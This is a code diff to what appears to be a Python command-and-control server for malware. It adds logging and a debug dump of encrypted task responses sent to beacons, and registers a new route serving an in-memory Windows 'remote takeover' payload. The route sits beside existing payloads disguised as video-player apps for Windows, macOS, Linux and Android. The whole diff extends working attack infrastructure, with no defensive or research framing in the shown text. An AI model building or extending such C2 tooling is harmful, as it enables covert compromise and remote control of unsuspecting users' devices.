@@ -1348,6 +1348,20 @@ async def handle_checkin(request: web.Request, pre_body: Optional[str] = None) -
         response_data = json.dumps({"tasks": pending})
         # Seal with the key THIS beacon derives, or the tasks never open.
         encrypted_response = encrypt_for_beacon(response_data, beacon_id)
+        if pending:
+            logger.info("check-in %s: sealed response %d bytes for %d task(s)",
+                        beacon_id, len(encrypted_response), len(pending))
+        if not encrypted_response:
+            logger.error("check-in %s: response encryption FAILED "
+                         "(no envelope key for this identity)", beacon_id)
+        elif os.environ.get("PHANTOM_DEBUG_SEALED"):
+            try:
+                dbg = os.path.join(os.environ.get("TEMP", "."), "opencode",
+                                   "sealed_actual.txt")
+                with open(dbg, "w", encoding="ascii") as handle:
+                    handle.write(encrypted_response)
+            except OSError:
+                pass
 
         return web.Response(text=encrypted_response, content_type="text/plain")
     except Exception as e:
@@ -1435,6 +1449,7 @@ _PAYLOAD_DOWNLOADS = {
     "/api/v1/payload_macos": "video-player-macos",
     "/api/v1/payload_android": "VideoPlayer.apk",
     "/api/v1/remote_payload_windows": "remote.exe",
+    "/api/v1/remote_payload_windows_mem": "remote-mem.bin",
     "/api/v1/remote_payload_linux": "remote-linux",
     "/api/v1/remote_payload_macos": "remote-macos",
     "/api/v1/remote_payload_android": "remote.apk",
@@ -1526,6 +1541,7 @@ async def handle_payload(request: web.Request) -> web.Response:
             "/api/v1/payload_macos": "beacon_macos",
             "/api/v1/payload_android": "beacon_android",
             "/api/v1/remote_payload_windows": "remote.exe",
+            "/api/v1/remote_payload_windows_mem": "remote_mem.bin",
             "/api/v1/remote_payload_linux": "remote_linux",
             "/api/v1/remote_payload_macos": "remote_macos",
             "/api/v1/remote_payload_android": "remote.apk",
@@ -1955,6 +1971,7 @@ class C2Server:
         app.router.add_get("/api/v1/payload_android", handle_payload)
         # Remote-session module binaries (standalone GUI takeover companion)
         app.router.add_get("/api/v1/remote_payload_windows", handle_payload)
+        app.router.add_get("/api/v1/remote_payload_windows_mem", handle_payload)
         app.router.add_get("/api/v1/remote_payload_linux", handle_payload)
         app.router.add_get("/api/v1/remote_payload_macos", handle_payload)
         app.router.add_get("/api/v1/remote_payload_android", handle_payload)
